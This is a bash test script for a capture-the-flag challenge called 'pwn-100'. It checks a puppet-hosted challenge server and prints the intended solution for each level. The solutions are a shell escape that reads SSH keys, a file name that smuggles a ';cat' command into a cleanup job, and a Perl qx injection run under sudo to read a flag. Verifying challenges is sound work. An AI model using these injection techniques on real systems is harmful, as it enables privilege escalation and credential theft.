#!/bin/bash

# pwn-100 test-script
# Need puppet client for testing
# Need level{1,2,3}.ssh.key for testing
# Need key.txt for testing

# Add the following line to hosts file
# <ip pwn-100>    puppet

ERROR=0

# check if we are root? - and run via bash
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 1>&2
   exit 2
fi

# Grep puppet from /etc/hosts
grep puppet /etc/hosts >/dev/null 2>&1
if [ $? -ne 0 ]
then
    echo "Please add puppet ip to hosts file"
    echo "<ip>	puppet"
    exit 2
fi

# Test if puppet works
if [ ! -e /tmp/level1.ssh.key ]
then
    find /var/lib/puppet -type f -print0 | xargs -0r rm
fi

puppet agent -t
if [ $? -ne 0 ]
then
    echo "ERROR: Puppet not working properly"
    ((ERROR++))
else
    echo "OK: Puppet is working properly"
fi

# Test level1 (still figuring out how to this automagically)
# ssh puppet -l level1 -i test/level1.ssh.key 
# !cat level2.ssh.key
echo "Test level1 manually by using the following commands:"
echo "$ ssh puppet -l level1 -i test/level1.ssh.key"
echo "Break out more with: !cat *key"
echo ""

# Test level2 (should also be done manually, so you don't leak too much info)
# ssh puppet -l level2 -i test/level2.ssh.key
# cd clean ; touch ";cat level3.ssh.key"
# Wait and check clean.log
echo "Test level2 manually by using the following commands:"
echo "$ ssh puppet -l level2 -i test/level2.ssh.key"
echo "$ cd clean; touch \";cat level3.ssh.key\""
echo "$ sleep 60; cat clean.log"
echo ""

# Test level 3
KEYFILE=test/key.txt
ssh puppet -l level3 -i test/level3.ssh.key "sudo -u level4 /home/level3/fancy.pl 'q.qx bcat flagb.q q'" > $KEYFILE.tmp

if [ "$(md5sum $KEYFILE|awk '{print $1}')" = "$(md5sum $KEYFILE.tmp|awk '{print $1}')" ]
then
    echo "OK: level3 working properly"
else
    echo "ERROR: level3 contains errors"
    ((ERROR++))
fi

rm -rf $KEYFILE.tmp

echo ""
if [ $ERROR -eq 0 ]
then
    echo "OK: Challenge working properly"
    exit 0
else
    echo "ERROR: Challenge contains errors"
    exit 2
fi
